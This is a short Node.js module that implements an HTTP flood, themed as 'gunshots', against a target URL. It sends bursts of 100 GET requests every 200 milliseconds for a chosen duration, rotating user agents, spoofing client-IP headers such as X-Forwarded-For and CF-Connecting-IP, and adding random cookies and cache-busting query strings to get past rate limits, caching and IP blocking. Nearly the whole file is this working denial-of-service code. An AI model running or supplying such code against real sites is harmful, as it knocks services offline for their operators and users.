const https = require("https");
const http = require("http");
const { URL } = require("url");

const userAgents = [
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/114.0.0.0 Safari/537.36",
  "Mozilla/5.0 (X11; Linux x86_64) Chrome/113.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Safari/605.1.15",
  "Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) Safari/604.1",
];

function randomIP() {
  return Array(4).fill(0).map(() => Math.floor(Math.random() * 256)).join(".");
}

function buildHeaders(hostname) {
  const ip = randomIP();
  return {
    "User-Agent": userAgents[Math.floor(Math.random() * userAgents.length)],
    "Referer": `https://${hostname}/?src=gun`,
    "X-Forwarded-For": ip,
    "Client-IP": ip,
    "CF-Connecting-IP": ip,
    "True-Client-IP": ip,
    "Cookie": `gunshot_session=${Math.random().toString(36).substring(2)}`
  };
}

function buildPath(basePath = "/") {
  const noise = `?bullet=${Math.random().toString(36).substring(2)}&rand=${Date.now()}`;
  return basePath.includes("?") ? basePath + "&" + noise.slice(1) : basePath + noise;
}

module.exports = function(target, duration) {
  const url = new URL(target);
  const client = url.protocol === "https:" ? https : http;
  const end = Date.now() + duration * 1000;

  function shootBurst() {
    for (let i = 0; i < 100; i++) {
      const options = {
        method: "GET",
        hostname: url.hostname,
        path: buildPath(url.pathname),
        port: url.port || (url.protocol === "https:" ? 443 : 80),
        headers: buildHeaders(url.hostname)
      };

      const req = client.request(options, res => {
        console.log(`[${res.statusCode}] Gunshot hit ${url.hostname}`);
        res.on("data", () => {});
      });

      req.on("error", () => {});
      req.end();
    }
  }

  function loop() {
    if (Date.now() >= end) return;
    shootBurst(); // burst of 70 "bullets"
    setTimeout(loop, 200); // simulate short reload time
  }

  loop();
};
